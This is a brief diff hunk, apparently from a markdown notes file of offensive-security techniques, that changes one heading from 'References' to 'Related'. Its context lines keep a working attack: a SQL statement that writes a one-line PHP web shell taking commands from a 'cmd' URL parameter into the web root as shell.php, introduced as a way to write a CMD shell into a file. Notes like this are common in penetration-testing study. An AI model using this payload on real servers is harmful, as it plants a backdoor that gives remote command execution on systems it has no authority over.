@@ -4,7 +4,7 @@ Write a CMD shell into a file with the right permissions. Issue the following se
 SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/html/shell.php"
 ```
 
-# References
+# Related
 
 Tags:
     #assorted
